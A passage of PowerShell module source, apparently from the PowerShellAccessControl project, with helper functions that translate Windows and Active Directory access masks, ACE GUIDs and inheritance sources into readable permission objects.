                    $Params.ValidAccesses = "ExtendedRight"
                }

                PropertySet {
                    $Params.ValidAccesses = "ReadProperty,WriteProperty"
                }

                { "Property","ClassObject" -contains $_ } {
                    $FunctionName = "GetSchemaObject"
                    $KeyPropertyName = "SchemaIdGuid"
                }

                ClassObject {
                    $Params.ObjectClass = "classSchema"
                }

                Property {
                    $Params.ObjectClass = "attributeSchema"
                }

                default {
                    throw "Unknown param set!"
                }
            }

            try {
                & $FunctionName @Params | ForEach-Object {
                    try {
                        $Value = $_.DisplayName -replace "\s","-"
                        $HashTable.Add($_.$KeyPropertyName, $Value)
                    }
                    catch {
                        Write-Warning ("Duplicate {$Type}: {0}" -f $_.$ValuePropertyName)
                    }

                    if ($_.PropertySet) {
                        $__DsPropertyToPropertySetTable.Add($_.$KeyPropertyName, $_.PropertySet)
                    }
                }
            }
            catch {
                throw $_
            }
            finally {
                Write-Progress -Activity Done -Status "Progress:" -Id 1 -Completed
            }
        }
        
    }
    process {
        switch ($PSCmdlet.ParameterSetName) {
            Lookup {

                if ($HashTable.ContainsKey($Guid)) {
                    New-Object PSObject -Property @{
                        Guid = $Guid
                        Name = $HashTable[$Guid]
                        Type = $Type
                    }
                }
                else {
                    Write-Error "Unknown $Type GUID: $Guid"
                }
            }

            ListAll {
                $HashTable.GetEnumerator() | select @{N="Guid"; E={$_.Key}}, @{N="DisplayName"; E={$_.Value}}, @{N="Type"; E={$Type}}
            }
        }

    }

    end {
    #        Write-Debug "$($MyInvocation.MyCommand): Exiting function"
    }
}

function script:LookupPropertySet {
  <#
      If given a property, get the propertyset
      If given a propertyset, get the properties

      Return is an object where 'Name' property is a property GUID, and
      'Value' property is a propertyset GUID

      Hash table is populated at the same time the Property hash table is
      populated (inside ConvertGuidToName function)

      Function is used in Get-EffectiveAccess function when ObjectAceType
      is used.
  #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ParameterSetName="Property")]
        $Property,
        [Parameter(Mandatory=$true, ParameterSetName="PropertySet")]
        $PropertySet
    )

    # If property to propertyset table hasn't been populated, then populate it
    if ($__DsPropertyToPropertySetTable.Count -eq 0) {
        $null = ConvertGuidToName -ListAll -Type "Property"
    }

    switch ($PSCmdlet.ParameterSetName) {
        "Property" {
            # Filter on name
            $FilterProperty = "Name"
        }

        "PropertySet" {
            # Filter on value
            $FilterProperty = "Value"
        }

        default {
            return
        }
    }

    $InputValues = $PSBoundParameters.($PSCmdlet.ParameterSetName)

    foreach ($InputValue in $InputValues) {
        # Guid form is needed to do lookup from hash table
        if ($InputValue -is [PSObject] -and $InputValue.Guid -is [guid]) {
            $InputValue = $InputValue.Guid
        }

        try {
            # Attempt to convert to a GUID (since string GUID may have been passed):
            $InputValue = [guid] $InputValue
        }
        catch {
            # Conversion failed, so attempt lookup via Get-ADObjectAceGuid

            $InputValue = Get-ADObjectAceGuid -Name $InputValue -ErrorAction Stop -TypesToSearch $PSCmdlet.ParameterSetName | select -ExpandProperty Guid
        }


        $__DsPropertyToPropertySetTable.GetEnumerator() | where { $InputValue -contains $_.$FilterProperty }
    }
}    

function script:ConvertNameToGuid {
  <#
      Opposite of ConvertGuidToName. If caching hash tables haven't been populated when the function
      is called, ConvertGuidToName is called to populate them.
  #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ParameterSetName="Lookup")]
        [string] $Name,
        [Parameter(Mandatory=$true)]
        [ValidateSet(
            "ValidatedWrite", 
            "ExtendedRight",
            "Property",
            "PropertySet",
            "ClassObject"
        )]
        [string] $Type
    )

    begin {
        # Grab the proper caching hash table:
        $HashTable = Get-Variable -Scope Script -Name "__Ds$TypeTable" -ValueOnly

        # Check to see if table has been populated. If not, populate it by calling the -ConvertGuidToName -ListAll and throwing the results
        # away (I don't think this should ever happen. This function should really only be called from the Get-SdObjectAceType and
        # Get-SdInheritedObjectAceType functions, and they would have already populated the hash tables by calling convertguidtoname.:
        if ($HashTable.Count -eq 0) {
            $null = ConvertGuidToName -ListAll -Type $Type
        }
    }
    process {
        $HashTable.GetEnumerator() | where { $_.Value -match $Name } | select @{N="Guid"; E={[guid] $_.Name }}, @{N="Name"; E={$_.Value}}, @{N="Type";E={$Type}}
    }
}

function script:GetPermissionString {
  <#
      Originally used to translate AD rights into friendly strings (Get-EffectiveAccess and
      New-AdaptedAcl both had the need to do this, and I didn't want to implement the code
      inside each function. I later decided to run all AccessMasks through this function
      (it makes the Get-EffectiveAccess code easier to follow). For that reason (originally
      for AD), the structure of the function is a little wacky (it basically assumes you're
      going to have an ObjectAceType, and if you don't (which you never will for any non-AD
      permissions), it still creates some objects assuming you're using AD perms. 
  #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
        [Int32] $AccessMask,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [guid] $ObjectAceType,
        $AccessMaskEnumeration = [int],
        [switch] $ListEffectivePermissionMode,
        [switch] $DontTranslateGenericRights
    )

    begin {

        $GenericRightsMask = 0
        [enum]::GetNames([PowerShellAccessControl.GenericAceRights]) | % { $GenericRightsMask = $GenericRightsMask -bor [PowerShellAccessControl.GenericAceRights]::$_.value__ }

    }

    process {
        
        # Function works off of ObjectAceTypeObject(s). This is geared towards AD permissions,
        # but non-AD permissions will work, too. If an ObjectAceType GUID isn't specified, then
        # a single ObjectAceTypeObject will be created after the if/else
        $ObjectAceTypeObject = $null
        if ($ObjectAceType -eq $null -or $ObjectAceType -eq [guid]::Empty) {
            $ObjectAceTypeName = "All"
        }
        else {
            try {
                $ObjectAceTypeObject = (Get-ADObjectAceGuid -Guid $ObjectAceType -ErrorAction Stop)
            }
            catch {
                $ObjectAceTypeName = $ObjectAceType
            }
        }
        
        # ObjectAceType either wasn't specified, or it was a GUID that couldn't be translated. Either
        # way, there will be no Type associated with the ObjectAceTypeObject. If this is an AD permission,
        # the name will either be 'All' (because the GUID was empty or non-existent, or the unknown GUID
        # (because it couldn't be translated)
        if ($ObjectAceTypeObject -eq $null) {
            $ObjectAceTypeObject = New-Object PSObject -Property @{
                Name = $ObjectAceTypeName
                Type = $null
            }
        }

        $Output = @()
        $NontranslatedString = $null

        # Check to see if GenericRights are included in the AccessMask (this works even if there are object
        # specific rights mixed in with the generic rights)
        if ($AccessMask -band $GenericRightsMask) {
            $GenericAccessMask = $AccessMask -band $GenericRightsMask   # Remove any object specific rights
            $AccessMask = $AccessMask -band (-bnot $GenericRightsMask)   # Remove any generic rights

            $GenericAccessMaskDisplay = $GenericAccessMask -as [PowerShellAccessControl.GenericAceRights]
            if ($DontTranslateGenericRights -or (-not $__GenericRightsMapping.ContainsKey($AccessMaskEnumeration))) {
                $Output += $GenericAccessMaskDisplay -split ", "
            }
            elseif ($__GenericRightsMapping.ContainsKey($AccessMaskEnumeration)) {
                $NontranslatedString = ($GenericAccessMaskDisplay, (GetPermissionString -AccessMask $AccessMask -AccessMaskEnumeration $AccessMaskEnumeration) | where { $_ -ne "None" }) -join ", "

                foreach ($CurrentRight in ($GenericAccessMaskDisplay -split ", ")) {
                    $AccessMask = $AccessMask -bor $__GenericRightsMapping[$AccessMaskEnumeration].$CurrentRight
                }

            }
        }

        $Output += foreach ($CurrentObject in $ObjectAceTypeObject) {
            # If an ObjectAceType was specified, then the AccessMask needs to be limited depending on the type
            # of the GUID. If an ObjectAceType wasn't specified (or if it was, but Get-ADObjectAceGuid couldn't
            # translate it), then the default{} block will take over, which won't try to limit the AccessMask
            switch ($CurrentObject.Type) {

                ClassObject {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights] "CreateChild, DeleteChild"
                }

                ExtendedRight {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights]::ExtendedRight
                }

                { "Property", "PropertySet" -contains $_ } {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights] "ReadProperty, WriteProperty"
                }
                                
                ValidatedWrite {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights]::Self
                }

                default {
                    try {
                        $LimitingPermissions = ([System.Enum]::GetValues($AccessMaskEnumeration) | select -Unique | sort { $_ -as $AccessMaskEnumeration } -Descending ) -join ", "
                    }
                    catch {
                        # $AccessMaskEnumeration probably wasn't an enum
                        $LimitingPermissions = $AccessMask
                    }
                }
            }

            if ($ListEffectivePermissionMode) {
                # Instead of a single limiting value, attempt to split the $LimitingPermissions into
                # multiple rights. Those strings will be converted back to ints since they are enumeration
                # names
                $LimitingPermissions = $LimitingPermissions -split ", "
            }

            foreach ($CurrentPermission in $LimitingPermissions) {
                if (($CurrentPermission -as $AccessMaskEnumeration) -ne $null) {
                    # Current permission string can be cast as the enumeration type, so band the provided
                    # AccessMask with the limiting permission. When the function isn't in 'ListEffectivePermissionMode',
                    # this is only useful for AD permissions (e.g., ObjectAceType is for a property, but the
                    # access mask is for 'FullControl'. The ACE would really only give Read/Write property
                    # permission, so this is where the rest of the FullControl rights would be removed.
                    # When the function is in 'ListEffectivePermissionMode', this is useful for all ACEs,
                    # since it will split the enumeration strings up and show which rights the provided
                    # AccessMask maps to
                    $ModifiedAccessMask = $AccessMask -band ($CurrentPermission -as $AccessMaskEnumeration)
                }
                else {
                    # Couldn't successfully cast to the enum type (which shouldn't happen). Basically, don't
                    # modify the access mask
                    $ModifiedAccessMask = $AccessMask
                }

                if ($ListEffectivePermissionMode) {
                    # The modified access mask listed above might not provide the permission specified by 
                    # $CurrentPermission. For that reason, always list the $CurrentPermission as the
                    # display access mask in this mode
                    $DisplayAccessMask = $CurrentPermission -as $AccessMaskEnumeration
                }
                else {
                    # Modified access mask will be translated to the display access mask
                    $DisplayAccessMask = $ModifiedAccessMask
                }

                # Recast the int value back into the enum string(s)
                $AccessString = $DisplayAccessMask -as $AccessMaskEnumeration

                if ($AccessMaskEnumeration -eq [PowerShellAccessControl.ActiveDirectoryRights]) {
                    # AD rights may be heavily modified, so there's some extra work to do
                    $ObjectName = $CurrentObject.Name
                    $ObjectType = $CurrentObject.Type

                    if ($CurrentObject.Type -eq $null) {
                        $AccessString = $AccessString -replace "Self", "Perform $ObjectName ValidatedWrite"
                        $AccessString = $AccessString -replace "ExtendedRight", "Perform $ObjectName ExtendedRight"
                        $AccessString = $AccessString -replace "\b(\w*)(Child|Property)\b", ('$1 {0} $2' -f $ObjectName)
                        $AccessString = $AccessString -replace "($ObjectName) Child", '$1 ChildObject'

                        if ($ObjectName -eq "All") {
                            $AccessString = $AccessString -replace "(ValidatedWrite|ExtendedRight|ChildObject)", '$1s'
                            $AccessString = $AccessString -replace ("({0}) Property" -f $CurrentObject.Name), '$1 Properties'
                        }
                        elseif ($ObjectName -as [guid]) {
                            # Valid Guid with $null Type means that this is some unknown ObjectAceType
                            $AccessString = $AccessString += " (Unknown ObjectAceType $ObjectName)"
                        }
                    }
                    else {
                        $AccessString = $AccessString -replace "Self|ExtendedRight", "Perform"
                        $AccessString = $AccessString -replace "Property|Child", ""
                        $AccessString = $AccessString -replace ",", " and"

                        $AccessString = "{0} {1} {2}" -f $AccessString, $ObjectName, $ObjectType
                    }
                }

                if ($ListEffectivePermissionMode) {
                    New-Object PSObject -Property @{
                        Allowed = [bool] ($ModifiedAccessMask -eq ($CurrentPermission -as $AccessMaskEnumeration))
                        Permission = $AccessString
                    }
                }
                elseif ($ModifiedAccessMask -ne 0) {
                    # Return the access string
                    $AccessString
                }
                
                # Nothing returned if modified access mask is 0 and not in ListEffectivePermissionMode
            }
        }

        if ($ListEffectivePermissionMode) {
            $Output
        }
        else {

            # Previous foreach() loop usually only runs once. There are some GUIDs that can be
            # interpreted as more than one type (bf9679c0-0de6-11d0-a285-00aa003049e2 is a
            # property and a validated write), so it might have run more than once. In that
            # scenario, there may be more than one string that was returned.
            if (-not $Output) { $Output = "None" }
            $Output = $Output -join ", "

            if ($NontranslatedString) {
                $Output = "$Output ($NontranslatedString)"
            }

            $Output
        }
    }
}

function New-AdaptedAcl {
  <#
      Takes as input either an adapted SD object (from New-AdaptedSecurityDescriptor) (-SDObject parameter), or a collection
      of access control entries (-Ace and -AccessMaskEnum parameters).

      Returns as output a collection of CommonAce or ObjectAce objects that have extra properties added.

      There is currently one issue that needs to be fixed: the AceType may be wrong on each object that comes out. That happens
      with ObjectAces and/or dynamic access control CallbackAces. The AceType is overwritten with either AccessAllowed, AccessDenied,
      or SystemAudit. This happens so that the "adapted" ACE can be piped into New-AccessControlEntry, Add-AccessControlEntry,
      Remove-AccessControlEntry, etc. I might try to just overwrite the ToString() method of the AceType in the future

      By default, generic access rights are translated to object specific access rights. That behavior can be suppressed by using
      the -DontTranlsateGenericRights switch.

      If the -GetInheritanceSource switch is used, inheritance source information will be checked using P/Invoke.
  #>

    # Default set to handle empty ACL coming through
    [CmdletBinding(DefaultParameterSetName="CommonAceObjects")]
    param(
        # Arrays of these *can* come through, but function doesn't handle that since it's a function
        # that should only be called internally
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ParameterSetName="BySD")]
        [ValidateScript({
            $_.pstypenames -contains $__AdaptedSecurityDescriptorTypeName
        })]
        $SDObject,
        [Parameter(ParameterSetName="BySD")]
        # Include discretionary ACL in output
        [switch] $Dacl,
        [Parameter(ParameterSetName="BySD")]
        # Include system ACL (if present) in output
        [switch] $Sacl,
        [switch] $DontTranslateGenericRights,
        [Parameter(ParameterSetName="BySD")]
        [switch] $GetInheritanceSource,
        [Parameter(Mandatory=$true, ParameterSetName="ByACE")]
        # Useful when there's a single ACE that needs to be converted (should actually work on multiples. This paramset was made for Get-MandatoryIntegrityLevel
        $Ace,
        [Parameter(ParameterSetName="ByACE")]
        $AccessMaskEnum
    )

    process {
        $AceObjects = @()
        $InheritanceArray = @{}  # Used to keep track of inheritance information for each ACL
        $GetPrincipalParams = @{} # Used when doing SID translation (not populated when ByACE
                                  # paramset is used)

        switch ($PSCmdlet.ParameterSetName) {
            BySD {

                # SID translation will fall back on SdPath and ObjectType if the SID can't be
                # translated locally, so fill in the hash table if the following properties
                # are available:
                if ($SDObject.SdPath) {
                    $GetPrincipalParams.SdPath = $SDObject.SdPath
                }
                if ($SDObject.ObjectType) {
                    $GetPrincipalParams.ObjectType = $SDObject.ObjectType
                }

                $AccessMaskEnum = $SDObject.GetAccessMaskEnumeration()

                # If neither -Dacl or -Sacl switch is provided, assume that the DACL is what's
                # requested
                if ($Dacl -or (-not $Dacl -and -not $Sacl)) {
                    # Add the discretionary ACL to the 
                    $AceObjects += '$SDObject.SecurityDescriptor.DiscretionaryAcl'

                    if ($GetInheritanceSource) {
                        try {
                            $InheritanceArray.Access = $SDObject | Get-InheritanceSource -Dacl -ErrorAction Stop
                        }
                        catch {
                            $GetInheritanceSource = $false
                        }
                    }
                }

                if ($Sacl) {
                    $AceObjects += '$SDObject.SecurityDescriptor.SystemAcl'

                    if ($GetInheritanceSource) {
                        try {
                            $InheritanceArray.Audit = $SDObject | Get-InheritanceSource -Sacl -ErrorAction Stop
                        }
                        catch {
                            $GetInheritanceSource = $false
                        }
                    }
                }
            }

            ByACE {
                $AceObjects += '$Ace'
            }

            default {
                return
            }
        }

        if ($AccessMaskEnum -eq $null) {
            # Numeric AccessMasks are cast to this type via -as in several places, so a null variable
            # won't work. If one wasn't supplied, just make the type [int] so that the AccessMask
            # stays numeric
            $AccessMaskEnum = [int]
        }

        $LastAceType = $null  # Used to keep track of the current ACE number so that Inheritance information
        $AceNumber = 0        # can be matched up. These are only used when $GetInheritanceSource is specified,
                              # and they are reset when the ACE type changes from Access to Audit (so it is
                              # assumed that the ACEs will come through with like types, i.e., all the Access ACEs
                              # (Allow or Deny) followed by all the Audit ACEs. That should be a valid
                              # assumption based on how $AceObjects is created)

        & ([scriptblock]::Create($AceObjects -join "; ")) | Where-Object { $_ } | ForEach-Object {

            $CurrentAce = $_

            # Make sure the ACE is a supported type:
            if ("IntegrityLevel", "CentralAccessPolicy" -contains $CurrentAce.AceType) {
                # Special CustomAce types that other functions in this module have put in. These are OK to adapt,
                # so no need to exit out with an error
            }
            elseif ($CurrentAce.AceType -notmatch "^(Access(Allowed|Denied)|SystemAudit)(Callback)?(Object)?$") {
                Write-Warning ("{0} ace type not supported!" -f $CurrentAce.AceType)
                return  # Exit this iteration of ForEach-Object
            }

            # Hash table will contain properties that will get added to the CommonAce
            <#
                Biggest time wasters (sorted):
                  1. AccessMaskDisplay
                  2. Principal
                  3. AceType

                Those together take the time it takes to get an AD object to over a second (not taking anything else in this function into account)
            #>
            $AdaptedAceProps = @{
                DisplayName = $SDObject.DisplayName
                InheritanceString = $SDObject.InheritanceString
                Path = $SDObject.Path
                Principal = GetPrincipalString -IdentityReference $CurrentAce.SecurityIdentifier @GetPrincipalParams
                AccessMaskDisplay = $CurrentAce | GetPermissionString -AccessMaskEnumeration $AccessMaskEnum -DontTranslateGenericRights:$DontTranslateGenericRights
                AceType = $CurrentAce.AceType.ToString() -replace "(Callback)?(Object)?$"  # All we care about is whether or not ACE is for Allow, Deny or Audit
                AppliesTo = $CurrentAce | GetAppliesToMapping
                OnlyApplyToThisContainer = [bool] ($CurrentAce.PropagationFlags -band [System.Security.AccessControl.PropagationFlags]::NoPropagateInherit)
            }

            if ($GetInheritanceSource) {
                # If inheritance source was obtained, there are potentially two lists: one for DACL and one for SACL
                # These ACEs are being fed through the pipeline, so the $CurrentAceType and $AceNumber keep track
                # of where in the $InheritanceArray.$CurrentAceType we are:
                $CurrentAceType = $AdaptedAceProps.AceType -replace "(Allowed$|Denied$|^System)"

                if ($LastAceType -ne $CurrentAceType) {
                    $AceNumber = 0
                    $LastAceType = $CurrentAceType
                }

                $AdaptedAceProps.InheritedFrom =  $InheritanceArray.$CurrentAceType[$AceNumber].AncestorName -replace "^\\\\\?\\"
            }

            # Make sure InheritedFrom property contains something:
            if (-not $AdaptedAceProps.InheritedFrom) {
                if ($CurrentAce.IsInherited) {
                    $AdaptedAceProps.InheritedFrom = "Parent Object"
                }
                else {
                    $AdaptedAceProps.InheritedFrom = "<not inherited>"
                }
            }

            # Clear this out in case a previous ACE was an object ACE, so later AD permission check won't show that old info:
            $InheritedObjectAceTypeProperties = $null

            # Do more stuff for ObjectAce
            if ($CurrentAce.AceType -match "Object$") {

                if ($CurrentAce.ObjectAceFlags -band [System.Security.AccessControl.ObjectAceFlags]::InheritedObjectAceTypePresent) {
                    try {
                        $InheritedObjectAceTypeProperties = ConvertGuidToName -Guid $CurrentAce.InheritedObjectAceType -Type ClassObject -ErrorAction Stop
                    }
                    catch {
                        $InheritedObjectAceTypeProperties = New-Object PSObject -Property @{
                            Name = $CurrentAce.InheritedObjectAceType
                            Type = $null
                            Guid = $CurrentAce.InheritedObjectAceType
                        }
                    }
                }

                $AdaptedAceProps.InheritedObjectAceTypeDisplayName = $InheritedObjectAceTypeProperties.Name
            }

            if ($CurrentAce.AceType -match "Callback") {
                $AdaptedAceProps.AccessMaskDisplay += " (CONDITIONAL STATEMENT GOES HERE)"
                $AdaptedAceProps.ConditonalBinaryData = $CurrentAce.GetOpaque()
                # Still missing a function to convert binary data to a string
            }

            # v3 and higher can take the hash table as a parameter to Add-Member, but to stay v2 compliant,
            # we'll just loop through each element in the ht and add it to the object to be returned. Also 
            # add the type name so the formatting system will take over how to display the objects.
            $AdaptedAceProps.GetEnumerator() | ForEach-Object {
                $CurrentAce | Add-Member -MemberType NoteProperty -Name $_.Name -Value $_.Value -Force
            }

            $CurrentAce.pstypenames.Insert(0, $__AdaptedAceTypeName)  #Custom typename used for PS formatting and type systems

            # Output ACE object:
            $CurrentAce

            # Increment ACE number to keep up with Inheritance information
            $AceNumber++
        }
    }
}

function script:MergeAclEntries {
  <#
      Use Get-Acl to take a look at c:\windows and HKLM:\SOFTWARE. You'll find multiple entries
      for different principals. The access masks are defintely different b/c the ACEs that apply
      to children are using generic rights. If you translate those generic rights into specific
      rights, you'll have a situation (at least on some of the ACEs) where the access mask, principal,
      inheritance source, etc all match. The only things that won't match are the AppliesTo. If all
      those other properties match, you can do what the ACL editor GUI does, and only show one ACE
      instead of multiple ones (and go ahead and combine the AppliesTo).

      One downside to this: this makes the resulting ACE's InheritanceFlags, PropagationFlags, and/or
      AceFlags not necessarily accurate. That's OK as long as you don't try to use the ACEs directly
      on a RawSecurityDescriptor or CommonSecurityDescriptor object outside of the module (you can
      use the .NET methods on one of the SD objects from this module, or the *-AccessControlEntry
      functions just fine). This will work fine as long as you use the ACE(s) with the PAC module
      b/c the ACE will be piped to the New-AccessControlEntry, and if the AppliesTo flags are specified
      (which they will be if they're piped in), inheritance and propagation are taken from that property
      instead of AceFlags property).

      One case this function doesn't currently handle: If everything is the same except the AccessMask, e.g.,
      two ACEs share everything, including the AppliesTo, then we should be able to combine the AccessMasks
      and return a single ACE. That's pretty rare, and it'll just have to wait for a future release.
  #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $Ace
    )

    begin {
        $PropertiesToGroupBy = @(
            "AceType"
            "SecurityIdentifier"
            {$_.AccessMaskDisplay -replace "\s\(.*\)$" }  # Get rid of any parenthesis from Generic rights translations
            "IsInherited"
            "OnlyApplyToThisContainer"
            "AuditFlags"         # Doesn't affect grouping access rights; this is a CommonAce property
            "ObjectAceType"           # Since it will be null if this is an ACE that doesn't contain this property, shouldn't affect grouping of normal non-object ACEs
            "InheritedObjectAceType"  # Since it will be null if this is an ACE that doesn't contain this property, shouldn't affect grouping of normal non-object ACEs
            "InheritedFrom" 
        )

        $CollectedAces = @()
    }

    process {
        # Function needs to collect all input first
        $CollectedAces += $Ace
    }

    end {
        Write-Debug "$($MyInvocation.MyCommand): Starting to merge ACEs"

        # Group on the collected ACEs, then output them
        $CollectedAces | Group-Object $PropertiesToGroupBy -Debug:$false |
            # Most of the time, each group is going to have one item (which means no ACEs were grouped). When ACEs were grouped,
            # the AppliesTo properties will almost certainly be different. Also, it's possible for the AccessMasks to be different
            # (if one of the ACEs used generic rights that were translated in the __Permissions string, and the other used
            # object specific/standard rights, then the AccessMask could be different). For that reason, those two properites will
            # be combined from all objects in the group, and then the first item in the group will have those two properties updated,
            # and they will be sent out into the world:
            ForEach-Object {
                if ($_.Count -gt 1) {

                    $NewAppliesTo = $NewAccessMask = 0
                    $NewAccessMaskDisplay = @()

                    $_.Group | ForEach-Object -Process { 
                        $NewAppliesTo = $NewAppliesTo -bor $_.AppliesTo.value__ 
                        $NewAccessMask = $NewAccessMask -bor $_.AccessMask
                        $NewAccessMaskDisplay += ($_.AccessMaskDisplay -replace "\s\(.*\)$") -split ", "
                    }

                    $_.Group[0] | 
                        Add-Member -MemberType NoteProperty -Name AppliesTo -Force -PassThru -Value ($NewAppliesTo -as [PowerShellAccessControl.AppliesTo]) |
                        Add-Member -MemberType NoteProperty -Name AccessMask -Force -PassThru -Value $NewAccessMask |
                        Add-Member -MemberType NoteProperty -Name AccessMaskDisplay -Force -PassThru -Value (($NewAccessMaskDisplay | select -Unique) -join ", ")
                }
                else {
                    # Just output the only element:
                    $_.Group[0]
                }
            }
    }
}

function Get-InheritanceSource {
  <#
      Uses WinApi to get ACE inheritance source
  #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        $SDObject,
        [switch] $Dacl,
        [switch] $Sacl
    )

    begin {
        # If neither switch was passed, act like Dacl was:
        if (-not ($PSBoundParameters.ContainsKey("Dacl") -or $PSBoundParameters.ContainsKey("Sacl"))) {
            $PSBoundParameters.Add("Dacl", $true)
        }

        # Each InheritArray entry takes up this much space (used to determine memory allocation, and to walk
        # the pointer
        $EntrySize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][PowerShellAccessControl.PInvoke.InheritArray])
    }

    process {
        foreach ($AclType in "Dacl","Sacl") {
            if (-not $PSBoundParameters.$AclType) {
                continue
            }

            if ($AclType -eq "Dacl") {
                $Acl = $SDObject.SecurityDescriptor.DiscretionaryAcl
            }
            else {
                $Acl = $SDObject.SecurityDescriptor.SystemAcl
            }

            if ($null -eq $Acl) {
                Write-Debug "$AclType is null"
                continue
            }

            # Get binary ACL form:
            $AclBytes = New-Object byte[] $Acl.BinaryLength
            $Acl.GetBinaryForm($AclBytes, 0)

            if ($__GenericRightsMapping.ContainsKey($SDObject.GetAccessMaskEnumeration())) {
                $GenericMapping = $__GenericRightsMapping[$SDObject.GetAccessMaskEnumeration()]
            }
            else {
                Write-Error "Missing generic mapping for type [$($SDObject.GetAccessMaskEnumeration().FullName)]"
                continue
            }

            [guid[]] $GuidArray = @()
            if ($SDObject.DsObjectClass) {
                # This is an AD object, so we need the guid for the call to GetInheritanceSource
                [guid[]] $GuidArray = Get-ADObjectAceGuid -Name ("^{0}$" -f $SDObject.DsObjectClass) -TypesToSearch ClassObject | select -first 1 -exp Guid
            }

            Write-Debug  ("{0}: Calling GetInheritanceSource() for $AclType on {1}" -f $MyInvocation.MyCommand, $SDObject.DisplayName)
            try {
                # Allocate memory for the InheritArray return array (one for each ACE)
                $InheritArray = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Acl.Count * $EntrySize)

                if ($AclType -eq "Sacl") {
                    # Make sure SeSecurityPrivilege is enabled
                    $SecurityPrivResults = SetTokenPrivilege -Privilege SeSecurityPrivilege
                }
                else {
                    $SecurityPrivResults = $null
                }

                [PowerShellAccessControl.PInvoke.advapi32]::GetInheritanceSource(
                    $SDObject.SdPath,       # ObjectName
                    $SDObject.ObjectType,   # ObjectType
                    [PowerShellAccessControl.PInvoke.SecurityInformation]::$AclType, # SecurityInfo
                    $SDObject.SecurityDescriptor.IsContainer, # Container
                    [ref] $GuidArray,  # ObjectClassGuids
                    $GuidArray.Count,                      # GuidCount
                    $AclBytes,              # Acl
                    [System.IntPtr]::Zero,  # pfnArray (must be null)
                    [ref] $GenericMapping,        # GenericMapping
                    $InheritArray           # InheritArray (return)

                ) | CheckExitCode -Action "Getting $AclType inheritance source for '$($SDObject.SdPath)'" -ErrorAction Stop

                try {
                    $Ptr = $InheritArray.ToInt64()
                    for ($i = 0; $i -lt $Acl.Count; $i++) {

                        $Struct = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Ptr, [type] [PowerShellAccessControl.PInvoke.InheritArray])
                        $Ptr += $EntrySize

                        New-Object PSObject -Property @{
                            AceNumber = $i
                            GenerationGap = $Struct.GenerationGap
                            AncestorName = $Struct.AncestorName
                        }
                    }
                }
                catch {
                    Write-Error $_
                    continue
                }
                finally {
                    # Make sure InheritArray is freed:
                    [PowerShellAccessControl.PInvoke.advapi32]::FreeInheritedFromArray(
                        $InheritArray, 
                        $Acl.Count, 
                        [System.IntPtr]::Zero
                    ) | CheckExitCode -Action "Freeing InheritedFrom array" -ErrorAction Stop
                }
            }
            catch {
                Write-Error $_
                continue
            }
            finally {
                # Free allocated memory
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($InheritArray)

                if ($SecurityPrivResults.PrivilegeChanged) {
                    # If this is true, then the privilege was changed, so it needs to be
                    # reverted back. If it's false, then the privilege wasn't changed (either
                    # b/c the user doesn't hold the privilege, or b/c it was already enabled;
                    # it doesn't really matter why). So, disable it if it was successfully
                    # enabled earlier.
                    $ActionText = "Reverting privilege '{0}' (back to disabled)" -f $SecurityPrivResults.PrivilegeName
                    Write-Debug "$($MyInvocation.MyCommand): $ActionText"
    
                    $NewResult = SetTokenPrivilege -Privilege $SecurityPrivResults.PrivilegeName -Disable
                    if (-not $NewResult.PrivilegeChanged) {
                        # This is an error; privilege wasn't changed back to original setting
                        Write-Error $ActionText 
                    }
                }
            }
        }
    }
}

function script:ConvertToIdentityReference {
  <#
      Attempts to convert an arbitrary object ($Principal) into a IdentityReference object. Optional 
      switch parameters allow return object to be returned as NTAccount or SecurityIdentifier objects. 
      It doesn't use the .NET .Translate() method since that doesn't appear to support remote 
      translation. Instead, it uses two functions from this module that use P/Invoke
  #>

    [CmdletBinding(DefaultParameterSetName="__AllParameterSets")]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, Position=0)]
        $Principal,
        [Parameter(Mandatory=$true, ParameterSetName="ReturnSid")]
        [switch] $ReturnSid,
        [Parameter(Mandatory=$true, ParameterSetName="ReturnAccount")]
        [switch] $ReturnAccount,
        [switch] $DontVerifyNtAccount,
        [string] $ComputerName
    )

    process {
        # Convert $Principal to an IdentityReference (most of the time, this will probably be a string, which will be treated
        # as a [System.Security.Principal.NTAccount], but can also be a SID object:

        $ExtraParam = @{}
        if ($PSBoundParameters.ContainsKey("ComputerName")) {
            $ExtraParam.ComputerName = $ComputerName
        }

        switch ($Principal.GetType().FullName) {
            { "System.String", "System.Security.Principal.NTAccount" -contains $_ } {
                # Principal will be an NTAccount (constructors below will cast this to an IdentityReference). Assume strings
                # are account names (if this fails, an attempt to convert to a sid will occur later)
                try {
                    $IdentityReference = [System.Security.Principal.NTAccount] $Principal
                }
                catch {
                    Write-Error $_
                    return
                }

                # Verify that this is a valid user
                try {
                    $TranslatedSid = Get-SidFromAccountName $IdentityReference @ExtraParam -ErrorAction Stop | select -exp Sid
                    $NtAccount = $IdentityReference  # Assign this if translation was successful
                }
                catch {
                    # Couldn't get a sid from what was assumed to be an account. It might have been a string representation of
                    # a SID, though
                    if ($Principal -like "S-*") { # This could use a regex
                        try {
                            # Attempt to convert supplied string to a SID (this shouldn't happen much with PAC module, b/c
                            # SIDs will usually come through as an object, not a string
                            $TranslatedSid = $IdentityReference = [System.Security.Principal.SecurityIdentifier] $Principal

                            # If we made it here, conversion must have worked!
                            break  # Break out of switch statement
                        }
                        catch {
                            # Don't do anything; parent catch block will output error
                        }
                    }

                    if ($DontVerifyNtAccount) {
                        $NtAccount = $IdentityReference  # Go ahead and assign this
                        break # Break out of switch statement
                    }
                    else {
